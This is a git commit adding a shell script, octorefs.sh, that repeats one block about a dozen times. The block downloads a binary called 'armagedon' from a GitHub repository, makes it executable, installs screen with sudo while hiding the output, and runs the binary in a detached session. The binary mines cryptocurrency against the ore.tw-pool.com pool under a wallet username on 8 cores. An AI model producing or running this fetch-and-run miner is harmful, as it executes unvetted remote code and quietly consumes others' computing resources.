b3c4263053f66a98581699759bd8766868d2cdc9
obisumila <obisumila@gmail.com>
2024-09-24 09:35:25 +0800

    Add files via upload

---
+++ octorefs.sh
@@ -0,0 +1,117 @@
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/bug-free-octo-winner/raw/refs/heads/main/armagedon ;
+chmod +x armagedon ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S ps -dm ./armagedon --url ws://ore.tw-pool.com:5487/mine mine --username HA91MkXhWfKJXCYjeFxzAucjeG6pQ849GFun5x5Cndsh.WINNER --cores 8 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
